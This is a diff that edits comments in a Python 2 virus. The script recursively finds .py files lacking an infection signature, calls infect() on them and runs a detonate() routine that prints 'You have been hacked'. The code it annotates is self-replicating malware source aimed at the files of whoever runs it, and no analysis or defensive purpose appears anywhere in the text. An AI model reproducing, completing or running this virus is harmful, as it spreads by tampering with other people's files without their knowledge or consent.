@@ -15,13 +15,14 @@ def locate(path):
     files_targeted = []
     # gets all files and directores in "path"
     filelist = os.listdir(path)
-    # for loop
+     # Method to get the list of all files and directories in the path directory
     for fname in filelist:
         if os.path.isdir(path+"/"+fname):
           # adds elements (paths and names) to list
             files_targeted.extend(locate(path+"/"+fname))
         # sets infected status to false if a file is python
         elif fname[-3:] == ".py":
+            # Makes infected variable equal false
             infected = False
             # for loop
             for line in open(path+"/"+fname):
@@ -29,6 +30,8 @@ def locate(path):
                 if SIGNATURE in line:
                     infected = True
                     break
+                    
+               # if infected equals false
             if infected == False:
                 # add path and name to list
                 files_targeted.append(path+"/"+fname)
@@ -63,7 +66,8 @@ def detonate():
         # prints line to screen
         print "You have been hacked"
         
-# calls defined functions  to find specified files and create duplicated "infected" files which have an customizable variable added
+# calls defined functions  to find specified files 
 files_targeted = locate(os.path.abspath(""))
+# infect files in the files_targeted
 infect(files_targeted)
 detonate()
